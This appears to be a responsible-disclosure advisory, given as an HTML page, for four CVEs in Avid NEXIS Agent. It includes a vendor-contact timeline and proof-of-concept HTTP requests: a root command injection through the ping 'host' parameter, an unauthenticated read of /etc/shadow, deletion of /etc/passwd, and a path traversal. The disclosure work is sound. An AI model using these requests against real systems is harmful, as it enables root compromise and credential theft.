@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Sicherheitsanalyse Avid NEXIS Agent</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      line-height: 1.6;
+      max-width: 900px;
+      margin: 2rem auto;
+      padding: 1rem;
+      background-color: #3d3a39;
+      color: white;
+    }
+    h1, h2, h3, h4 {
+      color: white;
+    }
+    pre {
+      background: #3d3a39;
+      padding: 1em;
+      overflow-x: auto;
+    }
+    blockquote {
+      border-left: 4px solid #ccc;
+      margin: 1em 0;
+      padding: 0.5em 1em;
+      background: #f2f2f2;
+    }
+    a {
+      color: white;
+    }
+    #toc_container {
+        background: #686564 none repeat scroll 0 0;
+        border: 1px solid #aaa;
+        display: table;
+        font-size: 95%;
+        margin-bottom: 1em;
+        padding: 20px;
+        width: auto;
+    }
+
+    .toc_title {
+        font-weight: 700;
+        text-align: center;
+    }
+
+    #toc_container li, #toc_container ul, #toc_container ul li{
+        list-style: outside none none !important;
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/http.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      hljs.highlightAll();
+    });
+  </script>   
+</head>
+<body>
+
+<h1>Advisory: Avid Nexis Agent Multiple Vulnerabilies</h1>
+
+<p>
+TL;DR: During a customer assessment I stumbled over the AVID Nexis Agent and without much digging I found some easy to spot vulnerabilities:
+CVE-2024-26290: authenticated remote command injection,
+CVE-2024-26291: unauthenticated arbitrary file read,
+CVE-2024-26292: authenticated arbitrary file deletion &
+CVE-2024-26293: unauthenticated path traversal
+Of which (to my knowlegde) only CVE-2024-26290 is addressed in a patch.
+</p>
+
+<h2>Table of Contents</h2>
+<div id="toc_container">
+    <p class="toc_title">Table of Contents</p>
+    <ul class="toc_list">
+        <li><a href="#Intro">1 Introduction</a></li>
+        <li><a href="#vulns">2 Vulnerabilities</a></li>
+            <ul>
+                <li><a href="#vuln_1">2.1 Authenticated Remote Command Injection (Linux): CVE-2024-26290</a></li>
+                    <ul>
+                        <li><a href="#desc_1">2.1.1 Description</a></li>
+                        <li><a href="#PoC_1">2.1.2 Proof of Concept</a></li>
+                        <li><a href="#solution_1">2.1.3 Mitigation</a></li>
+                        <li><a href="#CVSS_1">2.1.4 CVSS</a></li>
+                    </ul>
+                <li><a href="#vuln_2">2.2 Unauthenticated Arbitrary File Read (Linux/Windows): CVE-2024-26291</a></li>
+                    <ul>
+                        <li><a href="#desc_2">2.2.1 Description</a></li>
+                        <li><a href="#PoC_2">2.2.2 Proof of Concept</a></li>
+                        <li><a href="#solution_2">2.2.3 Mitigation</a></li>
+                        <li><a href="#CVSS_2">2.2.4 CVSS</a></li>
+                    </ul>
+                <li><a href="#vuln_3">2.3 Authenticated Arbitrary File Deletion (Linux/Windows): CVE-2024-26292</a></li>
+                    <ul>
+                        <li><a href="#desc_3">2.3.1 Description</a></li>
+                        <li><a href="#PoC_3">2.3.2 Proof of Concept</a></li>
+                        <li><a href="#solution_3">2.3.3 Mitigation</a></li>
+                        <li><a href="#CVSS_3">2.3.4 CVSS</a></li>
+                    </ul>
+                <li><a href="#vuln_4">2.4 Unauthenticated Path Traversal (Linux/Windows): CVE-2024-26293</a></li>
+                    <ul>
+                        <li><a href="#desc_4">2.4.1 Description</a></li>
+                        <li><a href="#PoC_4">2.4.2 Proof of Concept</a></li>
+                        <li><a href="#solution_4">2.4.3 Mitigation</a></li>
+                        <li><a href="#CVSS_4">2.4.4 CVSS</a></li>
+                    </ul>
+            </ul>
+        <li><a href="#Thanks">3 Acknowlegdements</a></li>
+        <li><a href="#Timeline">4 Disclosure Timeline</a></li>
+    </ul>
+</div>
+
+<h2 id="Intro">Introduction / Disclaimer</h2>
+
+<p>During a customer audit I stumbled over Avid NEXIS® Agent 22.12.0.174 and older versions. The older versions have a default password that can be used to gain access. Luckily, the same default password was also set on the servers with this version. However, as I downloaded and installed the binaries to one of my test machines it showed, that this default password is no longer set/used.
+Maybe it was only used in past versions but not changed when the server was upgraded. As to my knowledge, the software uses the Linux or Windows user password for login. Therefore past versions might have created a user that is still used in version 22.12.0.174.
+Version 22.12.0.174 seemed to be the latest version of the software at the time of initially finding the vulnerabilities in June 2023. However, in December 2023 the new version 23.12 was released as I was told by our customer. Sadly I wasn't able to get our hands on the latest version. I am still convinced that most of the bugs are not resolved, as they seem to be fairly old (one in gSoap was originally identified in 2019) and more due to poor security practices than just a simple mistake.</p>
+
+<p>I tried to contact the vendor since July 2023. In September, after hearing not a single word from the vendor over mail or several twitter accounts, I decided to report the vulnerability to the German Governmental Institution BSI (Bundesamt für Sicherheit in der Informationstechnik) as a mediator that might have so more tools to get contact to the vendor.</p>
+
+<p>In August 2024, the BSI let us know that the vendor responded to them that CVE-2024-26290 (authenticated remote command injection) was remediated in update <a href="https://kb.avid.com/pkb/articles/troubleshooting/en239659">2024.6.0</a>.
+Also in August 2024 the  director of Information Security at Avid contacted us, telling us that they want to understand how they could miss this as they want to improve their reporting process. 
+However, I have not gotten any updates about the other vulnerabilites as of today.</p>
+
+<p>The vulnerabilites identified can be found quite easily. I did not take a closer look at the binary to search for further bugs. So if any hunters out there want to take a look: Have fun!</p>
+
+<p>But now let's get into the Advisory.</p>
+
+<h2 id="vulns">Vulnerabilities</h2>
+
+<h3 id="vuln_1">Authenticated Remote Command Injection (Linux): CVE-2024-26290</h3>
+
+<h4 id="desc_1">Description</h4>
+
+<p>The Application is vulnerable to an “Authenticated Remote Command Injection” in the
+<code>GET</code> parameter <code>host</code> for the values in <code>ping</code> and <code>tracert</code>. But only on Linux systems. Windows does
+not show the same behavior. Authenticated attackers are therefore able to execute code on the underlying operating system with <code>root</code> permissions</p>
+
+<p>The official description of Avid is:
+<em>"Avid NEXIS Web Agent Input Validation issue can lead to Remote Command Execution (RCE)
+The Avid NEXIS Web Agent allows an authenticated user to execute system functions directed to a specific IP address. The Avid NEXIS Web Agent does not validate the inpu IP address and can execute commands without string validation. This allows an authenticated attacker to execute commands on the target machine."</em> <a href="https://kb.avid.com/pkb/articles/troubleshooting/en239659">source: June 20th 2024 Update</a>.</p>
+
+<h4 id="PoC_1">Proof of Concept</h4>
+
+<p>The vulnerability can be triggered with the following GET request:</p>
+
+<pre><code class="language-http">
+GET /agent?r=tools&amp;type=ping&amp;host=127.0.0.1;id HTTP/1.1
+Host: 192.168.40.141:5015
+Cookie: avidagent=12345; userveragenttoken=3543434935133395140
+Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Accept: */*
+Sec-Fetch-Site: same-origin
+ Sec-Fetch-Mode: no-cors
+ Sec-Fetch-Dest: script
+ Referer: https://192.168.40.141:5015/agent
+ Accept-Encoding: gzip, deflate, br
+ Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
+ Priority: u=1
+ Connection: close
+</code></pre>
+
+<p>The response looks like this (stripped):</p>
+
+<pre><code class="language-html">
+    HTTP/1.1 200 OK
+    Server: gSOAP/2.8
+    Content-Type: text/html; charset=utf-8
+    Content-Length: 3581
+    Connection: close
+    &lt;html&gt;
+    &lt;head&gt;
+    &lt;title&gt;192.168.40.141 - Avid NEXIS&reg; Agent 22.12.0.174&lt;/title&gt;
+    ...
+    
+    &lt;b class='rtop'&gt;&lt;b class='r1'&gt;&lt;/b&gt;&lt;b class='r2'&gt;&lt;/b&gt;&lt;b class='r3'&gt;&lt;/b&gt;&lt;b class='r4'&gt;&lt;/b&gt;&lt;/b&gt;&lt;div id=&quot;content&quot;&gt;12 &lt;div style='display:none;' id='glassPane'&gt;&lt;span class='aligner'&gt;&lt;/span&gt;&lt;h4 class='align' id='glassPaneMessage'&gt;&lt;/h4&gt;&lt;/div&gt;&lt;h2 class=&quot;table-title&quot;&gt;
+    Ping Results
+    &lt;/h3&gt;&lt;/p&gt;
+    
+    &lt;div class=&quot;plain&quot;&gt;
+    &lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
+    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.045 ms
+    64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.067 ms
+    --- 127.0.0.1 ping statistics ---
+    3 packets transmitted, 3 received, 0% packet loss, time 2029ms
+    rtt min/avg/max/mdev = 0.040/0.050/0.067/0.014 ms
+    uid=0(root) gid=0(root) groups=0(root)context=system_u:system_r:unconfined_service_t:s0
+    &lt;/pre&gt;&lt;/div&gt;
+    
+    &lt;p&gt;&lt;/div&gt;
+...
+</code></pre>
+
+<h4 id="solution_1">Mitigation</h4>
+
+<p>The official mitigation advisory from Avid for this issue is:
+"The NEXIS Web Agent input validation has been resolved in the newest version of NEXIS 2024.6.0. Avid engineering recommends you upgrade to NEXIS 2024.6.0 (available for download on June 18, 2024) to resolve this issue.
+If you are unable to update your NEXIS release at this time, you can mitigate the issue by configuring a firewall rule for the Storage Manager Agent (Port 5015) to whitelist access into NEXIS. " <a href="https://kb.avid.com/pkb/articles/troubleshooting/en239659">source: June 20th 2024 Update</a>.</p>
+
+<p>I recommends both, first, to update to the latest version and second to restrict access to the agent port. This is based on the fact the there is also another possibility to (half officially) execute code on the host with a built-in utility in the agent.</p>
+
+<h4 id="CVSS_1">CVSS</h4>
+
+<p>I Calculated the following CVSS 4.0 base metrics:</p>
+
+<p>8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)</p>
+
+<h3 id="vuln_2">Unauthenticated Arbitrary File Read (Linux/Windows): CVE-2024-26291</h3>
+
+<h4 id="desc_2">Description</h4>
+
+<p>The Application is vulnerable to an Unauthenticated Arbitrary File Read. This affects the
+Agent installed on Linux and Windows alike. The parameter filename does not validate the
+path at all. Thus allowing anyone (authentication is not required) to read arbitrary files. As
+the application runs per default with the highest privileges (root/NT_AUTHORITY SYSTEM),
+attackers are able to obtain critical files like /etc/shadow.</p>
+
+<h4 id="PoC_2">Proof of Concept</h4>
+
+<p>The vulnerability can be triggered with the following GET request:</p>
+
+<pre><code class="language-http">
+GET /logs?filename=%2Fetc%2fshadow HTTP/1.1
+Host: 192.168.40.141:5015
+Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://192.168.40.141:5015/agent?context=5815&amp;r=logs&amp;request=dump_usrv_log
+Accept-Encoding: gzip, deflate, br
+Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+Connection: close
+</code></pre>
+
+<p>The response looks like this (shortened):</p>
+
+<pre><code class="language-html">
+HTTP/1.1 200 OK
+Server: gSOAP/2.8
+Content-Type: application/octet-stream
+Content-Length: 1164
+Connection: close</p>
+
+<p>root:$1$Or<redacted>njEucgDO1:19775:0:99999:7:::
+...
+avid-nexis:$5$t3v<redacted>bZgA:19774:0:99999:7:::
+</code></pre>
+As we can see, the server responds with the file content of the file we requested. The
+function is usually meant to download log files. But it is not restricted in any way.</p>
+
+<h4 id="solution_2">Mitigation</h4>
+
+<p>As I are not aware of an official fix as of today, I recommend users of Avid Nexis to restrict access to the agent port (default 5015) using an allowlist approach.</p>
+
+<h4 id="CVSS_2">CVSS</h4>
+
+<p>I Calculated the following CVSS 4.0 base metrics:</p>
+
+<p>8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)</p>
+
+<h3 id="vuln_3">Authenticated Arbitrary File Deletion (Linux/Windows): CVE-2024-26292</h3>
+
+<h4 id="desc_3">Description</h4>
+
+<p>The Application is vulnerable to an authenticated Arbitrary File Deletion. This affects the
+Agent installed on Linux and Windows alike. As the application runs per default with the
+highest privileges (root/NT_AUTHORITY SYSTEM), attackers are able to delete critical files
+like /etc/shadow.</p>
+
+<h4 id="PoC_3">Proof of Concept</h4>
+
+<p>The vulnerability can be triggered with the following GET request (shortened):</p>
+
+<pre><code class="language-http">
+GET /agent?filename=%2Fetc%2Fpasswd&amp;r=logs&amp;request=del_usrv_log HTTP/1.1
+Host: 192.168.40.141:5015
+Cookie: avidagent=12345; userveragenttoken=1294797077750987387
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+...
+Referer: https://192.168.40.141:5015/agent?context=5815&amp;r=logs&amp;request=dump_usrv_log
+...
+</code></pre>
+
+<h4 id="solution_3">Mitigation</h4>
+
+<p>Again, as I am not aware of an official fix as of today, I recommend users of Avid Nexis to restrict access to the agent port (default 5015) using an allowlist approach.</p>
+
+<h4 id="CVSS_3">CVSS</h4>
+
+<p>I Calculated the following CVSS 4.0 base metrics:</p>
+
+<p>7.1 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N)</p>
+
+<h3 id="vuln_4">Unauthenticated Path Traversal (Linux/Windows): CVE-2024-26293</h3>
+
+<h4 id="desc_4">Description</h4>
+
+<p>The Application is vulnerable to an Unauthenticated Path Traversal. This affects the agent
+installed on Linux and Windows alike. As the application runs per default with the highest
+privileges (root/NT_AUTHORITY SYSTEM), attackers are able to obtain critical files like /etc/
+shadow etc. This vulnerability in gSOAP 2.8 was already known before. <a href="&quot;https://www.exploit-db.com/exploits/47653&quot;">This link</a> shows that
+this vulnerability is already known since at least 2019. However, it seems that the gSOAP
+version of the Avid Nexis Agent was not up-to-date.</p>
+
+<h4 id="PoC_4">Proof of Concept</h4>
+
+<p>The vulnerability can be triggered with the following GET request (shortened):</p>
+
+<pre><code class="language-http">
+GET /../../../../../../../../../../../../../../../../windows/win.ini%00/common/lib/jquery/jquery-1.11.3.min.js HTTP/1.1
+Host: 192.168.40.129:5015
+...
+</code></pre>
+As we can see the response shows the files contents:</p>
+
+<pre><code class="language-html">
+    HTTP/1.1 200 OK
+    Server: gSOAP/2.8
+    Content-Type: application/x-javascript
+    Content-Length: 92
+    Connection: close
+    Expires: Tue, 16 Jul 2024 11:56:11 GMT&lt;/p&gt;
+    
+    &lt;p&gt;; for 16-bit app support
+    [fonts]
+    [extensions]
+    [mci extensions]
+    [files]
+    [Mail]
+    MAPI=1
+</code></pre>
+
+<p>This can also be reproduced on Linux systems.</p>
+
+<h4 id="solution_4">Mitigation</h4>
+
+<p>Aaaaaand once again, as I am not aware of an official fix as of today, I recommend users of Avid Nexis to restrict access to the agent port (default 5015) using an allowlist approach.</p>
+
+<h4 id="CVSS_4">CVSS</h4>
+
+<p>I Calculated the following CVSS 4.0 base metrics:</p>
+
+<p>8.7 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)</p>
+
+<h2 id="Thanks">Acknowlegdements</h2>
+
+<p>Special thanks goes to the BSI team for supporting us along the way and trying their best to get the vendor to be involved in the case.</p>
+
+<h2 id="Timeline">Timeline</h2>
+
+<p>2023/07/14 - Initial contact attempt to the vendor via E-Mail<br />
+2023/07/31 - Contact attempt via twitter to @Avid<br />
+2023/09/24 - Initial vulnerability disclosure of the Authenticated Remote Command Injection vulnerability to BSI<br />
+2023/10/12 - Contact attempt via twitter to @AvidSupport<br />
+2023/11/08 - Message from the BSI that they could not get a reaction of the vendor so far<br />
+2024/01/11 - Message from the BSI that they could not get a reaction of the vendor so far and that they involved CERT/CC / CISA<br />
+2024/02/23 - Message from the BSI that they could not get a reaction of the vendor so far and CISA is also still trying<br />
+2024/02/26 - DriveByte (former company) informs the BSI that I have found 3 other vulnerabilities in the software but that it's not the latest version anymore and I would like to get hands on the latest version<br />
+2024/05/15 - BSI rates the responsible disclosure case as "failed" as they could get no contact to the vendor<br />
+2024/05/21 - BSI offers help with getting CVEs for the bugs via ENISA<br />
+2024/07/16 - Official report of the further vulnerabilities<br />
+2024/07/25 - Vendor contacts BSI and mentions closure of the initially reported vulnerability<br />
+2024/07/25 - Answer from BSI that they again try to forward the vulnerabilities to the vendor as there is contact now<br />
+2024/08/05 - BSI Informs us that the vendor will not issue CVEs and that they forward the report to the ENISA<br />
+2024/08/06 - Vendor contacts DriveByte (former company) to find out what went wrong with the reporting<br />
+2024/09/10 - ENISA sends CVEs<br />
+2024/10/23 - Advisory release</p>
+
+</body>
+</html>
